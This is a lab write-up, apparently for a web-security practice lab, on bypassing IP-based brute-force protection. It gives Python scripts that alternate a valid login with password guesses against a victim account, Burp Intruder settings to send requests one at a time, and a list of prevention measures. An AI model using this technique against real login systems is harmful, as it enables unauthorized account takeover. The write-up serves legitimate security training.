# Lab: Broken brute-force protection, IP block

## Objective

Exploit the flawed brute-force protection to discover Carlos's password and log into his account.

---

## Vulnerability

The application attempts to block brute-force attacks by limiting failed login attempts.

However, the protection contains a logic flaw that can be bypassed by alternating failed login attempts on Carlos with successful logins using another valid account.

---

## Lab Credentials

```
Username: wiener
Password: peter
```

Victim:

```
Username: carlos
```

---

## Steps

### Phase 1 - Understand the Protection

After several failed login attempts for Carlos, the application blocks further attempts.

A successful login using another valid account resets the protection.

---

### Phase 2 - Prepare Burp Intruder

Capture the following request:

```http
POST /login
```

Send it to **Intruder**.

---

### Phase 3 - Generate Payloads

Two payload positions are required.

#### Payload 1 (Usernames)

Generate the following pattern:

```
wiener
carlos
carlos
wiener
carlos
carlos
...
```

This sequence continuously resets the brute-force protection.

Python script:

```python
print("##########The following are the usernames:##############")
for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")
```

---

#### Payload 2 (Passwords)

Generate the following pattern:

```
peter
password1
password2
peter
password3
password4
...
```

Python script:

```python
print("###########The following are the password:##############")

with open("passwords123.txt", "r") as f:
    lines = f.readlines()

i = 0
for pwd in lines:
    if i % 3:
        print(pwd.strip())
    else:
        print("peter")
        print(pwd.strip())
        i += 1
    i += 1
```

---

### Phase 4 - Resource Pool

Burp Intruder sends multiple requests simultaneously by default.

This causes the attack to fail because the application expects requests in the exact order.

Configure a Resource Pool:

```
Maximum concurrent requests = 1
```

This forces Intruder to send one request at a time.

---

### Phase 5 - Start the Attack

Launch the Intruder attack.

Eventually a successful response appears:

```
HTTP/2 302 Found

Location: /my-account?id=carlos
```

This indicates the correct password has been found.

---

## Result

Successfully bypassed the brute-force protection.

Logged into Carlos's account.

Lab Solved ✅

---

## Why does this vulnerability exist?

The brute-force protection is reset after a successful login.

By alternating:

- Successful login (wiener)
- Failed attempts (carlos)

the attacker prevents the protection from permanently blocking the account.

The protection also assumes sequential requests, so sending concurrent requests breaks the attack unless Intruder is configured to send one request at a time.

---

## Prevention

- Track failed attempts per target account.
- Do not reset counters because another user logs in successfully.
- Apply proper account lockout.
- Implement exponential delays.
- Detect distributed brute-force attacks.

---

## Tools Used

- Burp Suite
  - Proxy
  - Intruder
  - Resource Pools

---

## Skills Learned

- Authentication Logic Flaws
- Burp Intruder
- Resource Pools
- Sequential Requests
- Brute Force Protection Bypass

---

## Real World Scenario

Some applications reset brute-force counters after any successful authentication.

Attackers can abuse this behavior by continuously authenticating with a valid account while brute-forcing another user's password.

---

## Key Takeaway

**Authentication protections should be tied to the target account rather than reset by unrelated successful logins. Sequential attack behavior should also be considered during defense design.**
